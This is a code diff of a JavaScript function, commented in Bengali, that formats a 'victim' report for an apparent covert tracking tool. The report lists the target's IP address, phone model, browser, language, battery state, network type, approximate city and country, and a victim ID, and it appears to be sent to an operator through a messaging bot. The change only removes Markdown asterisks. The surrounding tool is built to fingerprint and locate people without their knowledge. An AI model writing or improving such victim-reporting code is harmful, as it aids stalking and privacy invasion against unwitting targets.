@@ -241,49 +241,49 @@ function getBangladeshTime() {
 function formatVictimData(victim) {
   const d = victim.device || {};
   const deviceTime = getBangladeshTime();
-  let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
+  let msg = '✅ ভিক্টিমের তথ্য পাওয়া গেছে!\n\n';
   
   // IP
   if (victim.ip && victim.ip !== '0.0.0.0' && victim.ip !== 'N/A') {
-    msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip}\n`;
+    msg += `⚓️ আইপি অ্যাড্রেস: ${victim.ip}\n`;
   }
-  msg += `🕐 *সময়:* ${deviceTime}\n\n`;
+  msg += `🕐 সময়: ${deviceTime}\n\n`;
 
   // ডিভাইস
   const model = getDeviceModel(d);
-  msg += `📱 *ফোনের মডেল:* ${model}\n`;
+  msg += `📱 ফোনের মডেল: ${model}\n`;
   
   const browser = d.userAgent?.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[0-9.]+/)?.[0] || 'N/A';
-  msg += `🌐 *ব্রাউজার:* ${browser}\n`;
-  msg += `👆 *টাচ পয়েন্ট:* ${d.maxTouchPoints || 0}\n`;
-  msg += `🗣️ *ভাষা:* ${d.language || 'N/A'}\n\n`;
+  msg += `🌐 ব্রাউজার: ${browser}\n`;
+  msg += `👆 টাচ পয়েন্ট: ${d.maxTouchPoints || 0}\n`;
+  msg += `🗣️ ভাষা: ${d.language || 'N/A'}\n\n`;
 
   // ব্যাটারি
   const b = victim.battery || {};
-  msg += `🔋 *চার্জ:* ${b.level || 'N/A'}%\n`;
-  msg += `⚡ *চার্জিং:* ${b.charging ? 'হ্যাঁ ✅' : 'না ❌'}\n\n`;
+  msg += `🔋 চার্জ: ${b.level || 'N/A'}%\n`;
+  msg += `⚡ চার্জিং: ${b.charging ? 'হ্যাঁ ✅' : 'না ❌'}\n\n`;
 
   // নেটওয়ার্ক
   const network = victim.network || {};
   if (network.type && network.type !== 'N/A') {
-    msg += `📶 *নেটওয়ার্ক:* ${network.type}\n`;
+    msg += `📶 নেটওয়ার্ক: ${network.type}\n`;
   }
 
   // লোকেশন
   const loc = victim.location || {};
   if (loc.city && loc.country) {
-    msg += `📍 *আনুমানিক অবস্থান:* ${loc.city}, ${loc.country}\n`;
+    msg += `📍 আনুমানিক অবস্থান: ${loc.city}, ${loc.country}\n`;
   } else if (loc.city) {
-    msg += `📍 *আনুমানিক অবস্থান:* ${loc.city}\n`;
+    msg += `📍 আনুমানিক অবস্থান: ${loc.city}\n`;
   } else if (loc.country) {
-    msg += `📍 *আনুমানিক অবস্থান:* ${loc.country}\n`;
+    msg += `📍 আনুমানিক অবস্থান: ${loc.country}\n`;
   }
 
   // ================================================================
   // 🆔 ভিক্টিম আইডি (আবার যোগ করা হলো)
   // ================================================================
   if (victim.id) {
-    msg += `\n🆔 *ভিক্টিম আইডি:* ${victim.id}`;
+    msg += `\n🆔 ভিক্টিম আইডি: ${victim.id}`;
   }
 
   return msg;
